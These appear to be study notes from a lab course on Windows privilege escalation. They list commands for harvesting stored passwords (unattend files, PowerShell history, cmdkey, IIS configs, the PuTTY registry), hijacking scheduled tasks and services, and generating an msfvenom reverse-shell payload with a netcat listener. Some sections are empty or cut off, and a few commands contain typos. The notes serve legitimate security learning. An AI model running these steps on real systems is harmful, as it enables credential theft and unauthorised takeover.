# Here we go!

Depending on the situation, we might need to abuse some of the following weaknesses:

+ **Misconfigurations on Windows services or scheduled tasks**
+ **Excessive privileges assigned to our account**
+ **Vulnerable software**
+ **Missing Windows security patches**


## Windows Users
Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

+ `Administrators`	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
+ `Standard Users`	These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

+ `SYSTEM / LocalSystem` An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
+ `Local Service` Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
+ `Network Service` Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


## Unattended Windows Installation
When administrators use Windows Deployment Services which allows for a single operating system image to be deployed to several hosts through the network., the result night end up being stored in the machine in the gfollowing locations:
+ C:\Unattend.xml
+ C:\Windows\Panther\Unattend.xml
+ C:\Windows\Panther\Unattend\Unattend.xml
+ C:\Windows\system32\sysprep.inf
+ C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```
Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```


## Powershell History
+ CMD: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+ Powershell: `type  $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`


## Saved Windows credentials
+ List saved credentials: `cmdkey /list`
+ Use saved credentials: `runas /savecred /user:admin <command>`


## IIS Configuration
IIS Web site configuration file can be located in:
+ C:\inetpub\wwwroot\web.config
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:
`type \path\to\web.conf | findstr connectionString`


## Retrieve Credentials from Software: PuTTY
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Scheduled tasks
1. Identify scheduled tasks using the command `schtasks` example:
    ```
    schtasks /query /tn vulntask /fo list /v
    ```
2. Then check if you can edit the `Task to Run` so that you can elevate your privilege and act as the user `Run As User`:
    ```
    icacls \path\to\task\to\run
    ```
3.  Edit the task to run with a reverse shell
4.  If you can start the task manually to save time: `
    ```
    chtasks /run /tn vulntask
    ```


## AlwaysInstallElevated


## Windows Services
+ Windows services are managed by **Service Control Manager(SCM)** . `sc` is a command line program used to communicate with SCM. E.g To check configuration of the service AppHOstSvc: `sc qc apphostsvc`
+ With powershell use `sc.exe`
+ All services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`


## Insecure Permissions on Service Executable
1. List services with `sc` and look for ine that may have weak permissions set
2. Verify permissions of selected services:
   ```
   icacls \path\to\service\exec\file
   ```
3. Generate appropriate paylod and transfert it to the target with
   ```
   msfvenom -p <payload> -f exe-service -o <name>.exe LHOST=<ip> LPORT=<port>
   ```
4. Set up the listener
   ```
   nc -lvnp <port>
   ```
5. Download the payload, install it and give him appropriate permissions so that it can be executed by SCM
6. Restart the service if you can or wait the start
   ```
   sc stop <service_name>
   sc start <service_name>
   ```


## Unquoted Service Paths
1. Idenfity service that path is unquoted and its executable contains spaces
2. Check that you have sufficient privileges to add malicious file to exploit unquoted flaw
3. Generate appropriate paylod and transfert it to the target
4. Set up the listener and download the payload
5.  install it and give him appropriate permissions so that it can be executed by SCM
6. Restart the service if you can or wait the start    


## Insecure Service Permissions
1. Check that the service has DACL that allow you to modify its configuration. Eg `accesschk64.exe -qlc <service_name>. You can find accesschk here https://download.sysinternals.com/files/AccessChk.zip
2. 















